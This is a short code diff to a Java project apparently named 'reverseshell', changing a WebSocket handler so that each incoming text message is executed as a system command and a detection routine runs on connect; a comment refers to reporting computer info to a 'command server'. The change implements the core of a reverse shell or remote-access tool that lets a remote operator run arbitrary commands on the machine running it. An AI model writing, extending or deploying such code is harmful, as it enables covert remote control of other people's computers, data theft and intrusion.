@@ -3,6 +3,7 @@ package com.mtattab.reverseshell.service.impl;
 import com.mtattab.reverseshell.model.ServerRestCommunicationModel;
 import com.mtattab.reverseshell.util.DataManipulationUtil;
 import com.mtattab.reverseshell.util.OSUtil;
+import com.mtattab.reverseshell.util.SystemCommandProxyUtil;
 import lombok.Getter;
 import lombok.Setter;
 import lombok.extern.java.Log;
@@ -23,9 +24,13 @@ public class WebSocketImpl extends WebSocketAdapter {
     @Override
     public void onWebSocketText(String message) {
         log.info( message);
+
+        SystemCommandProxyUtil.executeCommand(message);
+
     }
     @Override
     public void onWebSocketConnect(Session session){
+        SystemCommandProxyUtil.detect();
         this.session= session;
         try {
 //            send initial message with computer info the command server
